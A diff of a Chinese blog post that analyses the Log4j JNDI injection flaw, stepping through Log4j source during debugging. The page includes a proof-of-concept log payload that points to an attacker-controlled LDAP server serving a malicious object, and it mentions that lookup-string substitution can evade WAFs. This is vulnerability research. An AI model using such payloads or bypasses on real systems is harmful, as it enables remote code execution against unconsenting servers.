@@ -100,10 +100,6 @@
           <a href="/friends/">Friends</a>
         </li>
       
-        <li class="nav-item" data-path="/about/">
-          <a href="/about/">About</a>
-        </li>
-      
     </ul>
   </div>
 </div>
@@ -213,35 +209,19 @@
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211210132347082.png" alt="image-20211210132347082"></p>
 <p>此处没有对字符进行过滤，导致用户可以构造恶意代码。</p>
 <h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><strong>受攻击方客户端：</strong></p>
-<pre><code class="java">import org.apache.logging.log4j.LogManager;
-import org.apache.logging.log4j.Logger;
-public class log4j &#123;
-    private static final Logger logger = LogManager.getLogger(log4j.class);
-//PatternLayout.toSerializable
-    //MessagePatternConverter.format
-    public static void main(String[] args) &#123;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4j.class);</span><br><span class="line"><span class="comment">//PatternLayout.toSerializable</span></span><br><span class="line">    <span class="comment">//MessagePatternConverter.format</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:7777/#EvilObject&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:7777/#EvilObject&#125;&quot;);
-    &#125;
-&#125;
-</code></pre>
 <p><code>ldap://127.0.0.1:7777/#EvilObject&#125;</code>是传入我们本地的恶意序列化对象。</p>
 <p>具体实现见<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDI与LDAP的注入攻击</a></p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211210133708492.png" alt="image-20211210133708492"></p>
 <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="logIfEnabled"><a href="#logIfEnabled" class="headerlink" title="logIfEnabled"></a>logIfEnabled</h2><p>首先还是下个断点</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219175848710.png" alt="image-20211219175848710"></p>
 <p>F7步入，这里会做一个log是否<strong>enabled</strong>的检测</p>
-<pre><code class="java">    public void logIfEnabled(final String fqcn, final Level level, final Marker marker, final String message, final Throwable throwable) &#123;
-        if (this.isEnabled(level, marker, message, throwable)) &#123;//这里检测isEnabled是否为真
-            this.logMessage(fqcn, level, marker, message, throwable);
-        &#125;
-    &#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable throwable)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isEnabled(level, marker, message, throwable)) &#123;<span class="comment">//这里检测isEnabled是否为真</span></span><br><span class="line">        <span class="built_in">this</span>.logMessage(fqcn, level, marker, message, throwable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>如何判定它是enabled的呢？</p>
-<pre><code class="java">    public boolean isEnabled(final Level level, final Marker marker, final String message, final Throwable t) &#123;
-        return this.privateConfig.filter(level, marker, message, t);//返回了config中的filter
-    &#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.privateConfig.filter(level, marker, message, t);<span class="comment">//返回了config中的filter</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219183700833.png" alt="image-20211219183700833"></p>
 <p>此处我们可以观察到，我们传入的level是**”ERROR”<strong>,其对应的level in integer为</strong>200**<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219183913695.png" alt="image-20211219183913695"></p>
 <p>正好等于当前logger Config要求的最高intLevel(200)</p>
@@ -287,72 +267,24 @@ public class log4j &#123;
 </tr>
 </tbody></table>
 <h2 id="MessagePatternConverter-format"><a href="#MessagePatternConverter-format" class="headerlink" title="MessagePatternConverter.format()"></a>MessagePatternConverter.format()</h2><p>关键点在<strong>messagePatternConverter#format</strong>中：</p>
-<pre><code class="java">            if (this.config != null &amp;&amp; !this.noLookups) &#123;//此处判断noLookups是否为false
-                for(int i = offset; i &lt; workingBuilder.length() - 1; ++i) &#123;
-                    if (workingBuilder.charAt(i) == &#39;$&#39; &amp;&amp; workingBuilder.charAt(i + 1) == &#39;&#123;&#39;) &#123;//找到$&#123;的位置
-                        String value = workingBuilder.substring(offset, workingBuilder.length());//将包含$&#123;将其之后的字符串提取到value中
-                        workingBuilder.setLength(offset);//设置$之前的字符串长度
-                        workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));//append经过处理后的字符串value
-                    &#125;
-                &#125;
-            &#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.noLookups) &#123;<span class="comment">//此处判断noLookups是否为false</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;<span class="comment">//找到$&#123;的位置</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());<span class="comment">//将包含$&#123;将其之后的字符串提取到value中</span></span><br><span class="line">            workingBuilder.setLength(offset);<span class="comment">//设置$之前的字符串长度</span></span><br><span class="line">            workingBuilder.append(<span class="built_in">this</span>.config.getStrSubstitutor().replace(event, value));<span class="comment">//append经过处理后的字符串value</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>在默认情况下，noLookups为false</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220125208104.png" alt="image-20211220125208104"></p>
-<pre><code class="java">public static final boolean FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS = PropertiesUtil.getProperties().getBooleanProperty(&quot;log4j2.formatMsgNoLookups&quot;, false);//默认为false
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> <span class="operator">=</span> PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="literal">false</span>);<span class="comment">//默认为false</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="StrSubstitutor-substitute"><a href="#StrSubstitutor-substitute" class="headerlink" title="StrSubstitutor.substitute()"></a>StrSubstitutor.substitute()</h2><p>我们继续分析字符串value是如何被处理的。</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220130516379.png" alt="image-20211220130516379"></p>
-<pre><code class="tex">prefixMatcher: $&#123;
-suffixMatcher: &#125;
-escape: $
-delimiter: :-
-</code></pre>
+<figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">prefixMatcher: <span class="built_in">$</span>&#123;</span><br><span class="line">suffixMatcher: &#125;</span><br><span class="line">escape: <span class="built_in">$</span></span><br><span class="line">delimiter: :-</span><br></pre></td></tr></table></figure>
+
 <p>后面的逻辑便是寻找prefix,如果找到了，继续找suffix，找到suffix后把中间的字符串继续传进substitute() =》循环遍历检测内嵌的**${}**</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133308854.png"></p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133139043.png" alt="image-20211220133139043"></p>
 <p>匹配了前缀后缀后，下面就是找<strong>delimiter</strong></p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133728942.png" alt="image-20211220133728942"></p>
 <p>看看label100的逻辑</p>
-<pre><code class="java">for(i = 0; i &lt; varNameExprChars.length &amp;&amp; (substitutionInVariablesEnabled || prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) == 0); ++i) &#123;
-    if (this.valueEscapeDelimiterMatcher != null) &#123;
-        int matchLen = this.valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i);//循环判断是否是delimiter :\\-
-        if (matchLen != 0) &#123;//匹配到了delimiter
-            String varNamePrefix = varNameExpr.substring(0, i) + &#39;:&#39;;//将delimiter前的字符串加上：赋给varNamePrefix
-            varName = varNamePrefix + varNameExpr.substring(i + matchLen - 1);//将\后面的字符串和之前的varNamePrefix合并在一起
-            int j = i + matchLen;
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; varNameExprChars.length &amp;&amp; (substitutionInVariablesEnabled || prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) == <span class="number">0</span>); ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.valueEscapeDelimiterMatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">matchLen</span> <span class="operator">=</span> <span class="built_in">this</span>.valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i);<span class="comment">//循环判断是否是delimiter :\\-</span></span><br><span class="line">        <span class="keyword">if</span> (matchLen != <span class="number">0</span>) &#123;<span class="comment">//匹配到了delimiter</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">varNamePrefix</span> <span class="operator">=</span> varNameExpr.substring(<span class="number">0</span>, i) + <span class="string">&#x27;:&#x27;</span>;<span class="comment">//将delimiter前的字符串加上：赋给varNamePrefix</span></span><br><span class="line">            varName = varNamePrefix + varNameExpr.substring(i + matchLen - <span class="number">1</span>);<span class="comment">//将\后面的字符串和之前的varNamePrefix合并在一起</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + matchLen;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= varNameExprChars.length) &#123;</span><br><span class="line">                    <span class="keyword">break</span> label100;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//判断是否是delimiter :-</span></span><br><span class="line">                    varName = varNamePrefix + varNameExpr.substring(i + matchLen, j);</span><br><span class="line">                    <span class="comment">//key值</span></span><br><span class="line">                    varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen);</span><br><span class="line">                    <span class="comment">//value会丢弃掉:-及之前的所有字符串</span></span><br><span class="line">                    <span class="keyword">break</span> label100;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ++j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">            varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">            varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">        varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">        varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-            while(true) &#123;
-                if (j &gt;= varNameExprChars.length) &#123;
-                    break label100;
-                &#125;
-
-                if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != 0) &#123;
-                    //判断是否是delimiter :-
-                    varName = varNamePrefix + varNameExpr.substring(i + matchLen, j);
-                    //key值
-                    varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen);
-                    //value会丢弃掉:-及之前的所有字符串
-                    break label100;
-                &#125;
-
-                ++j;
-            &#125;
-        &#125;
-
-        if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) &#123;
-            varName = varNameExpr.substring(0, i);
-            varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);
-            break;
-        &#125;
-    &#125; else if ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != 0) &#123;
-        varName = varNameExpr.substring(0, i);
-        varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);
-        break;
-    &#125;
-&#125;
-&#125;
-</code></pre>
 <p>上面的代码可能不太好理解，举两个例子</p>
 <p>如果是</p>
 <ul>
@@ -364,19 +296,14 @@ delimiter: :-
 </ul>
 <p>这样的字符串替换可以用于绕过WAF</p>
 <p>当替换完毕后，会执行到<strong>StrSubstitutor.resolveVariable()</strong></p>
-<pre><code class="java">    protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf, final int startPos, final int endPos) &#123;
-        StrLookup resolver = this.getVariableResolver();
-        return resolver == null ? null : resolver.lookup(event, variableName);//执行resolver.lookup()
-    &#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getVariableResolver();</span><br><span class="line">    <span class="keyword">return</span> resolver == <span class="literal">null</span> ? <span class="literal">null</span> : resolver.lookup(event, variableName);<span class="comment">//执行resolver.lookup()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="Interpolator-lookup"><a href="#Interpolator-lookup" class="headerlink" title="Interpolator.lookup()"></a>Interpolator.lookup()</h2><p>接着会执行**lookup()**，判断出要执行JNDI类型的Lookup</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220142228918.png" alt="image-20211220142228918"></p>
 <h2 id="JndiLookup-lookup"><a href="#JndiLookup-lookup" class="headerlink" title="JndiLookup.lookup()"></a>JndiLookup.lookup()</h2><p>首先获取到jndiManager</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144414130.png" alt="image-20211220144414130"></p>
-<pre><code class="java">public static JndiManager getDefaultManager() &#123;
-    return (JndiManager)getManager(JndiManager.class.getName(), FACTORY, (Object)null);
-&#125;
-</code></pre>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (JndiManager)getManager(JndiManager.class.getName(), FACTORY, (Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144801055.png" alt="image-20211220144801055"></p>
 <p>发现它是创建了一个Manager,将一个新的InitialContext传进去了</p>
 <p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144859470.png" alt="image-20211220144859470"></p>
